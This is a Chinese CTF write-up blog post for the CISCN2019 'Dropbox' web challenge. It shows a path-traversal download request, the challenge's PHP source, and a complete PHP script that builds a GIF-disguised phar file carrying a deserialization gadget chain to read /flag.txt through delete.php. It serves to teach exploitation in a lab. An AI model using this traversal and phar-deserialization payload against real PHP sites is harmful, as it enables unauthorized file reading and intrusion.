@@ -1,0 +1,381 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>CISCN2019 华北赛区 Day1 Web1 Dropbox _0x41-0x4F | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">CISCN2019 华北赛区 Day1 Web1 Dropbox _0x41-0x4F</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/">2021-10-28</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>题目给出的是一个登录框，并且有注册操作</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005613695.png" alt="image-20211028005613695"></p>
+<p>我们可以先注册个账号登录下</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005651708.png" alt="image-20211028005651708"></p>
+<p>有上传文件的功能，尝试文件上传，发现写死了，只允许图片上传。</p>
+<p>那我们先上传个图片看一看</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005810078.png" alt="image-20211028005810078"></p>
+<p>增加了两个功能，下载和删除</p>
+<p>抓包来看一看</p>
+<pre><code>POST /download.php HTTP/1.1
+Host: dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 26
+Origin: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81
+Connection: close
+Referer: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81/index.php
+Cookie: UM_distinctid=17ba73558f3490-0c95ed277ed4498-4c3f217f-144000-17ba73558f4710; PHPSESSID=ad225e350fb42f426122effecd7c8b7c
+
+filename=w5w.jpg
+</code></pre>
+<p>这里有个关键点filename=w5w.jpg，我们可以尝试将w5w.jpg改为别的文件名称</p>
+<p>首先改为 ../../index.php</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011042791.png" alt="image-20211028011042791"></p>
+<p>成功读取到了index.php的源码。</p>
+<p>这时候尝试盲猜路径读取flag，并没有什么结果。那就读取下其他源码看一看吧</p>
+<p>依次读取了</p>
+<p>index.php,download.php,delete.php,class.php</p>
+<p>index.php</p>
+<pre><code class="php">&lt;?php
+session_start();
+if (!isset($_SESSION[&#39;login&#39;])) &#123;
+    header(&quot;Location: login.php&quot;);
+    die();
+&#125;
+?&gt;
+&lt;?php
+include &quot;class.php&quot;;
+
+$a = new FileList($_SESSION[&#39;sandbox&#39;]);
+$a-&gt;Name();
+$a-&gt;Size();
+?&gt;
+</code></pre>
+<p>这个里面没有什么有价值的东西</p>
+<p>class.php</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+$dbaddr = &quot;127.0.0.1&quot;;
+$dbuser = &quot;root&quot;;
+$dbpass = &quot;root&quot;;
+$dbname = &quot;dropbox&quot;;
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User &#123;
+    public $db;
+
+    public function __construct() &#123;
+        global $db;
+        $this-&gt;db = $db;
+    &#125;
+
+    public function user_exist($username) &#123;
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;store_result();
+        $count = $stmt-&gt;num_rows;
+        if ($count === 0) &#123;
+            return false;
+        &#125;
+        return true;
+    &#125;
+
+    public function add_user($username, $password) &#123;
+        if ($this-&gt;user_exist($username)) &#123;
+            return false;
+        &#125;
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);
+        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
+        $stmt-&gt;execute();
+        return true;
+    &#125;
+
+    public function verify_user($username, $password) &#123;
+        if (!$this-&gt;user_exist($username)) &#123;
+            return false;
+        &#125;
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;bind_result($expect);
+        $stmt-&gt;fetch();
+        if (isset($expect) &amp;&amp; $expect === $password) &#123;
+            return true;
+        &#125;
+        return false;
+    &#125;
+
+    public function __destruct() &#123;
+        $this-&gt;db-&gt;close();
+    &#125;
+&#125;
+
+class FileList &#123;
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) &#123;
+        $this-&gt;files = array();
+        $this-&gt;results = array();
+        $this-&gt;funcs = array();
+        $filenames = scandir($path);
+
+        $key = array_search(&quot;.&quot;, $filenames);
+        unset($filenames[$key]);
+        $key = array_search(&quot;..&quot;, $filenames);
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) &#123;
+            $file = new File();
+            $file-&gt;open($path . $filename);
+            array_push($this-&gt;files, $file);
+            $this-&gt;results[$file-&gt;name()] = array();
+        &#125;
+    &#125;
+
+    public function __call($func, $args) &#123;
+        array_push($this-&gt;funcs, $func);
+        foreach ($this-&gt;files as $file) &#123;
+            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
+        &#125;
+    &#125;
+
+    public function __destruct() &#123;
+        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;
+        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;
+        foreach ($this-&gt;funcs as $func) &#123;
+            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;
+        &#125;
+        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;
+        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;
+        foreach ($this-&gt;results as $filename =&gt; $result) &#123;
+            $table .= &#39;&lt;tr&gt;&#39;;
+            foreach ($result as $func =&gt; $value) &#123;
+                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;
+            &#125;
+            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#39;;
+            $table .= &#39;&lt;/tr&gt;&#39;;
+        &#125;
+        echo $table;
+    &#125;
+&#125;
+
+class File &#123;
+    public $filename;
+
+    public function open($filename) &#123;
+        $this-&gt;filename = $filename;
+        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;
+            return true;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+
+    public function name() &#123;
+        return basename($this-&gt;filename);
+    &#125;
+
+    public function size() &#123;
+        $size = filesize($this-&gt;filename);
+        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);
+        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    &#125;
+
+    public function detele() &#123;
+        unlink($this-&gt;filename);
+    &#125;
+
+    public function close() &#123;
+        return file_get_contents($this-&gt;filename);
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>很多函数，最关键的是我们发现了 file_get_contents,这应该是题目的突破点</p>
+<p>download.php</p>
+<pre><code class="php">&lt;?php
+session_start();
+if (!isset($_SESSION[&#39;login&#39;])) &#123;
+    header(&quot;Location: login.php&quot;);
+    die();
+&#125;
+
+if (!isset($_POST[&#39;filename&#39;])) &#123;
+    die();
+&#125;
+
+include &quot;class.php&quot;;
+ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);
+
+chdir($_SESSION[&#39;sandbox&#39;]);
+$file = new File();
+$filename = (string) $_POST[&#39;filename&#39;];
+if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;
+    Header(&quot;Content-type: application/octet-stream&quot;);
+    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));
+    echo $file-&gt;close();
+&#125; else &#123;
+    echo &quot;File not exist&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>这里可以看到flag被过滤了，所以我们是无法直接读取flag的</p>
+<p>delete.php</p>
+<pre><code class="php">&lt;?php
+session_start();
+if (!isset($_SESSION[&#39;login&#39;])) &#123;
+    header(&quot;Location: login.php&quot;);
+    die();
+&#125;
+
+if (!isset($_POST[&#39;filename&#39;])) &#123;
+    die();
+&#125;
+
+include &quot;class.php&quot;;
+
+chdir($_SESSION[&#39;sandbox&#39;]);
+$file = new File();
+$filename = (string) $_POST[&#39;filename&#39;];
+if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;
+    $file-&gt;detele();
+    Header(&quot;Content-type: application/json&quot;);
+    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);
+    echo json_encode($response);
+&#125; else &#123;
+    Header(&quot;Content-type: application/json&quot;);
+    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);
+    echo json_encode($response);
+&#125;
+?&gt;
+</code></pre>
+<p>存在任意文件下载漏洞，相应也存在任意文件删除漏洞。这里的意思不过返回True与False，没有发现什么有用的地方。</p>
+<p>接下来我们来审计一下代码。</p>
+<p>利用点：</p>
+<pre><code class="php">public function close() &#123;
+        return file_get_contents($this-&gt;filename);
+    &#125;
+</code></pre>
+<p>看一下哪些地方调用了close函数</p>
+<p>download.php中的</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011750225.png" alt="image-20211028011750225"></p>
+<p>class.php的user类里面存在</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p>
+<p>这里执行的实际是关闭数据库的操作，但是有趣的是它和我们需要调用的函数重名。</p>
+<p>download.php存在过滤，无法使用，所以我们尝试使用class.php中的魔术方法__destruct()来调用</p>
+<p>如何调用__destruct()魔术方法呢，也就是如何调用对象呢，必须使用反序列化</p>
+<p>但是整个代码中并没有出现过unserialize()这个函数，所以我们并不能直接进行序列化。</p>
+<p>这时候就可以利用phar://伪协议，可以不依赖unserialize()直接进行反序列化操作.</p>
+<p>关于phar的讲解可以看另外一篇博客：</p>
+<p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p>审计代码，我们可以发现一个很有趣的魔术方法：</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028012434528.png" alt="image-20211028012434528"></p>
+<p>它在什么时候调用呢？</p>
+<p>这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在的方法，__call 方法将会被自动调用</p>
+<p>这里__call的代码的意思就是如果调用的对象不存在，就会把这个函数写入$this-&gt;funcs,并且遍历文件，让每一个文件执行一遍这个函数。</p>
+<p>因此我们的思路就清晰了一点。</p>
+<p>首先反序列化一个类，这个类不存在close()方法(如果存在的话就不需要这么复杂了)，然后对这个类调用close()方法，因为它不存在，所以会调用__call魔术方法，call魔术方法就可以调用close方法，从而完成file_get_contents函数的利用。</p>
+<p>所以操作就是：</p>
+<p>反序列化$user</p>
+<p>调用完成，对象被销毁时，调用函数__destruct魔术方法</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p>
+<p>使$user -&gt; db = FileList()</p>
+<p>FileList这个类调用close(),不存在，调用__call方法，调用close()</p>
+<p>接下来就可以来构建pop链：</p>
+<pre><code class="php">&lt;?php
+class User &#123;
+public $db;
+public function __construct() &#123;
+        $this-&gt;db = new FileList();
+    &#125;
+&#125;
+class FileList &#123;
+    
+    private $files;
+    private $results;
+    private $funcs;
+    public function __construct() &#123;
+        $this-&gt;files = array(new File());
+        $this-&gt;results = array();
+        $this-&gt;funcs = array();
+    
+&#125;
+&#125;
+
+class File &#123;
+    public $filename = &#39;/flag.txt&#39;;
+&#125;
+
+$user = new User;
+
+@unlink(&quot;sakura.phar&quot;);
+
+$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar
+
+$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作
+
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+
+$phar-&gt;setMetadata($user); //将自定义的meta-data存入manifest
+
+$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件
+
+//签名自动计算
+
+$phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
+<p>运行得到sakura.phar文件，修改后缀为sakura.jpg，上传</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014454461.png" alt="image-20211028014454461"></p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014549020.png" alt="image-20211028014549020"></p>
+<p>访问delete.php</p>
+<p>注意为什么不访问download.php来实行攻击？</p>
+<p>这里要注意一个细节：</p>
+<p>download.php中存在</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014231785.png" alt="image-20211028014231785"></p>
+<p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php，否则访问不到沙箱内的上传目录。</p>
+<p>访问delete.php,使用phar进行反序列化，成功得到flag</p>
+<p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014632248.png" alt="image-20211028014632248"></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/">https://sakurahack-y.github.io/2021/10/28/CISCN2019-华北赛区-Day1-Web1-Dropbox-0x41-0x4F/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">phar反序列化漏洞 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2021 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
